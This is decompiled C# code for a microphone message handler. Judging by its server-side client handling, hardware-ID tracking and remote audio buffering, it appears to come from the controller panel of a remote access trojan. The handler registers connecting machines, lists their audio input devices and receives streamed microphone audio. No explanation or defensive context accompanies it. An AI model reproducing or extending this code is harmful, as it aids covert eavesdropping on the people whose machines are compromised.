using System;
using System.Windows.Forms;
using NAudio.Wave;
using Server.Connectings;
using Server.Forms;

namespace Server.Messages
{
	// Token: 0x02000067 RID: 103
	internal class HandlerMicrophone
	{
		// Token: 0x06000206 RID: 518 RVA: 0x00021174 File Offset: 0x0001F374
		public static void Read(Clients client, object[] objects)
		{
			string a = (string)objects[1];
			if (!(a == "Connect"))
			{
				if (!(a == "Recovery"))
				{
					return;
				}
				if (client.Tag == null)
				{
					client.Disconnect();
					return;
				}
				((FormMicrophone)client.Tag).Buffer((byte[])objects[2]);
				return;
			}
			else
			{
				FormMicrophone form = (FormMicrophone)Application.OpenForms["Microphone:" + (string)objects[2]];
				if (form == null)
				{
					client.Disconnect();
					return;
				}
				if (objects.Length > 3)
				{
					Console.WriteLine((string)objects[3]);
					form.client1 = client;
					form.Invoke(new MethodInvoker(delegate()
					{
						foreach (string item in ((string)objects[3]).Split(new char[]
						{
							','
						}))
						{
							form.rjComboBox1.Items.Add(item);
						}
						form.rjComboBox1.SelectedIndex = 0;
						form.Text = "Microphone [" + (string)objects[2] + "]";
						form.groupBox1.Enabled = true;
					}));
					client.Tag = form;
					client.Hwid = (string)objects[2];
					return;
				}
				form.client2 = client;
				form.Invoke(new MethodInvoker(delegate()
				{
					try
					{
						for (int i = 0; i < WaveIn.DeviceCount; i++)
						{
							form.rjComboBox2.Items.Add(WaveIn.GetCapabilities(i).ProductName);
						}
						form.rjComboBox2.SelectedIndex = 0;
					}
					catch
					{
					}
					form.Text = "Microphone [" + (string)objects[2] + "]";
					form.groupBox2.Enabled = true;
				}));
				client.Tag = form;
				client.Hwid = (string)objects[2];
				return;
			}
		}
	}
}
